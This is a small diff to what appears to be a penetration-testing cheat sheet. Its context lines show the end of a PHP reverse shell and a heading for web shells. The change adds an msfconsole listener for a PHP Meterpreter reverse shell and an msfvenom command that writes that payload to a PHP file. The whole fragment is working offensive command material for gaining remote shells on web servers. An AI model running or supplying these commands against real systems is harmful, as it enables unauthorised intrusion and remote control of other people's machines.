@@ -128,6 +128,8 @@ msfconsole -q -x "use multi/handler; set LHOST $MYIP; set LPORT 4444; run"
         exec("sh <&3 >&3 2>&3");
         }
 ?>
+msfconsole -q -x "use exploit/multi/handler; set payload php/meterpreter/reverse_tcp; set LHOST $MYIP; set LPORT 4444; run"
+msfvenom -p php/meterpreter/reverse_tcp LHOST=$MYIP LPORT=4444 -f raw > msfshell.php
 
 [*] Web Shell
 <html>
